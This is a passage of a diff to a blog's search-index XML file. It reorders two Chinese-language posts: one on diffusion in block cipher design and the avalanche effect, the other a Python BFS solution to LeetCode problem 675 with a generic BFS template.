class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
-<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>
-]]></content>
-      <categories>
-        <category>LeetCode_daily</category>
-      </categories>
-      <tags>
-        <tag>BFS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Diffusion Basic</title>
-    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
-    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
-<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
-<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
-<p>在研究扩散性时，如果往其最基本单元考虑：</p>
-<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
-<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
-<blockquote>
-<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
-</blockquote>
-<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
-<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
-]]></content>
       <tags>
         <tag>Crypto</tag>
       </tags>
@@ -762,6 +755,69 @@ The\;end</script>]]></content>
       </categories>
       <tags>
         <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Diffusion Basic</title>
+    <url>/2022/05/26/Cryptanalysis/Basic-Diffusion/</url>
+    <content><![CDATA[<p>香农提出了密码设计的两种基本方法即 混淆和扩散。</p>
+<p>分组密码系统包括 线性部分 和 非线性部分，其对应功能分别是 扩散和混淆。</p>
+<p>扩散性往往由线性函数提供，如 rotation ，shift ，或更复杂的 MDS matrix（但其本质也是 rotation and shift）。</p>
+<p>在研究扩散性时，如果往其最基本单元考虑：</p>
+<p>线性运算时一般是 位切片操作，即对每一个 bit 进行运算。那么总体来看就是一个面向 GPU 友好型的 <a href="https://baike.baidu.com/item/%E5%8D%95%E6%8C%87%E4%BB%A4%E6%B5%81%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%81/257612">SIMD</a> 操作 ，对一个 bit 的操作不会影响到其他 bits，显然这是不能够满足扩散性的，那么就需要一些 rotation，shift… 来将 bit 打散，使其能够更多的参与到非线性运算。</p>
+<p>由于 扩散主要是用来使用明文和密文的关系变得尽可能的复杂，明文中任何一点小更动都会使得密文有很大的差异，即达到雪崩效应。</p>
+<blockquote>
+<p>雪崩效应：对于密码而言，要求输入位的 1 bit 变化导致每个输出位 bit 有 50% 的概率发生反转</p>
+</blockquote>
+<p><a href="https://crypto.stackexchange.com/questions/19000/shannon-confusion-and-diffusion-concept/44659#44659">The job of the linear diffusion layer is to ensure that each successive input to the non-linear function consists of a balanced and maximum number of super-positioned input bits.</a></p>
+<p>而验证扩散性是否能够尽可能地达到使密码系统安全的办法，除建立相关性方程，利用如 Mathmatica 等工具来搜索之外，可能还需要考虑由于扩散不全而造成的分支代数次数低，差分线性分析等等。</p>
+]]></content>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LC 5.23 t.675 Cut Off Trees for Golf Event</title>
+    <url>/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/</url>
+    <content><![CDATA[<h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
+<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
+<ul>
+<li><code>0</code> 表示障碍，无法触碰</li>
+<li><code>1</code> 表示地面，可以行走</li>
+<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
+</ul>
+<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
+<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
+<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
+<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
+<p><strong>示例 1：</strong></p>
+<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
+<p><strong>示例 2：</strong></p>
+<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
+<p><strong>示例 3：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
+<p><strong>提示：</strong></p>
+<ul>
+<li><code>m == forest.length</code></li>
+<li><code>n == forest[i].length</code></li>
+<li><code>1 &lt;= m, n &lt;= 50</code></li>
+<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
+</ul>
+<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
+<p>类似 <a href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
+<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
+<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>
+]]></content>
+      <categories>
+        <category>LeetCode_daily</category>
+      </categories>
+      <tags>
+        <tag>BFS</tag>
       </tags>
   </entry>
   <entry>
